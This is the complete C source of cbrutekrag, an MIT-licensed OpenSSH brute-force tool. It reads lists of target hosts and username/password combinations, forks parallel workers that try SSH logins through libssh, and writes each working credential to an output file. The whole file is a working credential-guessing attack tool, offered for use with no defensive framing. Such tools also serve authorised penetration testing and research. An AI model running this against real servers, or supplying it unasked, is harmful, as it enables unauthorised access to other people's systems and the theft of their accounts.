/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#include "cbrutekrag.h"

int g_verbose = 0;
int g_timeout = 3;
char *g_blankpass_placeholder = "$BLANKPASS";

char** str_split(char* a_str, const char a_delim)
{
    char** result = 0;
    size_t count = 0;
    char* tmp = a_str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp) {
        if (a_delim == *tmp) {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (a_str + strlen(a_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof(char*) * count);

    if (result) {
        size_t idx  = 0;
        char* token = strtok(a_str, delim);

        while (token) {
            assert(idx < count);
            *(result + idx++) = strdup(token);
            token = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}

void print_error(const char *format, ...)
{
    va_list arg;
    fprintf(stderr, "\033[91m");
    va_start(arg, format);
    vfprintf(stderr, format, arg);
    va_end (arg);
    fprintf(stderr, "\033[0m\n");
}

void print_debug(const char *format, ...)
{
    if (g_verbose != 1) {
        return;
    }
    va_list arg;
    fprintf(stderr, "\033[37m");
    va_start(arg, format);
    vfprintf(stderr, format, arg);
    va_end (arg);
    fprintf(stderr, "\033[0m\n");
}

const char *str_repeat(char *str, size_t times)
{
    if (times < 1) return NULL;
    char *ret = malloc(sizeof(str) * times + 1);
    if (ret == NULL) return NULL;
    strcpy(ret, str);
    while (--times > 0) {
        strcat(ret, str);
    }
    return ret;
}

void update_progress(int count, int total, char* suffix, int bar_len)
{
    if (g_verbose) {
        return;
    }

    struct winsize w;
    ioctl(0, TIOCGWINSZ, &w);

    int max_cols = w.ws_col;

    if (bar_len < 0) bar_len = max_cols - 80;
    if (suffix == NULL) suffix = "";

    int filled_len = bar_len * count / total;
    int empty_len = bar_len - filled_len;
    float percents = 100.0f * count / total;
    int fill = max_cols - bar_len - strlen(suffix) - 16;

    if (bar_len > 0) {
        printf("\033[37m[");
        if (filled_len > 0) printf("\033[32m%s", str_repeat("=", filled_len));
        printf("\033[37m%s\033[37m]\033[0m", str_repeat("-", empty_len));
    }
    if (max_cols > 60) printf("  %.2f%%   %s", percents, suffix);
    if (fill > 0) printf("%s\r", str_repeat(" ", fill));
    fflush(stdout);
}

void print_banner()
{
    printf(
        "\033[92m           _                _       _\n"
        "          | |              | |     | |\n"
        "\033[37m      ___\033[92m | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
        "\033[37m     / __|\033[92m| '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
        "\033[37m    | (__ \033[92m| |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
        "\033[37m     \\___|\033[92m|_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
        "               \033[0m\033[1mOpenSSH Brute force tool 0.2.1\033[92m       __/ |\n"
        "             \033[0m(c) Copyright 2017 Jorge Matricali\033[92m    |___/\033[0m\n\n"
    );
}

void usage(const char *p)
{
    printf("\nusage: %s [-h] [-v] [-T TARGETS.lst] [-C combinations.lst]\n"
            "\t\t[-t THREADS] [-o OUTPUT.txt]\n\n", p);
}

int try_login(const char *hostname, const char *username, const char *password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;
    int port = 22;

    if (g_verbose) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        print_error("Cant create SSH session\n");
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
#if LIBSSH_VERSION_MAYOR > 0 || (LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
#endif
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &g_timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);

    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (g_verbose) {
            print_error(
                "Error connecting to %s: %s\n",
                hostname,
                ssh_get_error(my_ssh_session)
            );
        }
        return -1;
    }

    r = ssh_userauth_none(my_ssh_session, username);
    if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return r;
    }

    int method = 0;

    method = ssh_userauth_list(my_ssh_session, NULL);

    if (method & SSH_AUTH_METHOD_NONE) {
        r = ssh_userauth_none(my_ssh_session, NULL);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    if (method & SSH_AUTH_METHOD_PASSWORD) {
        r = ssh_userauth_password(my_ssh_session, NULL, password);
        if (r == SSH_AUTH_SUCCESS) {
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return -1;
}

wordlist_t load_wordlist(char *filename)
{
    FILE *fp;
    wordlist_t ret;
    char **words = NULL;
    ssize_t read;
    char *temp = 0;
    size_t len;

    fp = fopen(filename, "r");
    if (fp == NULL) {
        print_error("Error opening file. (%s)\n", filename);
        exit(EXIT_FAILURE);
    }

    for (int i = 0; (read = getline(&temp, &len, fp)) != -1; i++) {
        strtok(temp, "\n");
        if (words == NULL) {
            words = malloc(sizeof(temp));
            *words = strdup(temp);
        } else {
            words = realloc(words, sizeof(temp) * (i + 1));
            *(words + i) = strdup(temp);
        }
        ret.lenght = i + 1;
    }
    fclose(fp);

    ret.words = words;

    return ret;
}

int brute(char *hostname, char *username, char *password, int count, int total, FILE *output)
{
    char bar_suffix[50];
    sprintf(bar_suffix, "[%d] %s %s %s", count, hostname, username, password);

    update_progress(count, total, bar_suffix, -1);
    int ret = try_login(hostname, username, password);
    if (ret == 0) {
        print_debug("LOGIN OK!\t%s\t%s\t%s\n", hostname, username, password);
        if (output != NULL) {
            fprintf(output, "LOGIN OK!\t%s\t%s\t%s\n", hostname, username, password);
        }
        return 0;
    } else {
        print_debug("LOGIN FAIL\t%s\t%s\t%s\n", hostname, username, password);
    }
    return -1;
}

int main(int argc, char** argv)
{
    int opt;
    int total = 0;
    int THREADS = 1;
    char *hostnames_filename = NULL;
    char *combos_filename = NULL;
    char *output_filename = NULL;
    FILE *output;

    while ((opt = getopt(argc, argv, "T:C:t:o:vh")) != -1) {
        switch (opt) {
            case 'v':
                g_verbose = 1;
                break;
            case 'T':
                hostnames_filename = optarg;
                break;
            case 'C':
                combos_filename = optarg;
                break;
            case 't':
                THREADS = atoi(optarg);
                break;
            case 'o':
                output_filename = optarg;
                break;
            case 'h':
                print_banner();
                usage(argv[0]);
                exit(EXIT_SUCCESS);
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }
    print_banner();

    if (hostnames_filename == NULL) {
        hostnames_filename = strdup("hostnames.txt");
    }
    if (combos_filename == NULL) {
        combos_filename = strdup("combos.txt");
    }

    wordlist_t hostnames = load_wordlist(hostnames_filename);
    wordlist_t combos = load_wordlist(combos_filename);
    total = hostnames.lenght * combos.lenght;

    printf("\nCantidad de combos: %zu\n", combos.lenght);
    printf("Cantidad de hostnames: %zu\n", hostnames.lenght);
    printf("Combinaciones totales: %d\n\n", total);
    printf("Cantidad de threads: %d\n\n", THREADS);

    if (output_filename != NULL) {
        output = fopen(output_filename, "a");
        if (output == NULL) {
            print_error("Error opening output file. (%s)\n", output_filename);
            exit(EXIT_FAILURE);
        }
    }

    pid_t pid = 0;
    int p = 0;
    int count = 0;

    for (int x = 0; x < combos.lenght; x++) {
        char **login_data = str_split(combos.words[x], ' ');
        if (login_data == NULL) {
            continue;
        }
        if (strcmp(login_data[1], g_blankpass_placeholder) == 0) {
            login_data[1] = strdup("");
        }
        for (int y = 0; y < hostnames.lenght; y++) {

            if (p >= THREADS){
                waitpid(-1, NULL, 0);
                p--;
            }

            print_debug(
                "HOSTNAME=%s\tUSUARIO=%s\tPASSWORD=%s\n",
                hostnames.words[y],
                login_data[0],
                login_data[1]
            );

            pid = fork();

            if (pid) {
                p++;
            } else if(pid == 0) {
                brute(hostnames.words[y], login_data[0], login_data[1], count, total, output);
                exit(EXIT_SUCCESS);
            } else {
                print_error("Fork failed!\n\n");
            }

            count++;
        }
    }

    pid = 0;

    if (output != NULL) {
        fclose(output);
    }

    printf("\n");

    exit(EXIT_SUCCESS);
}
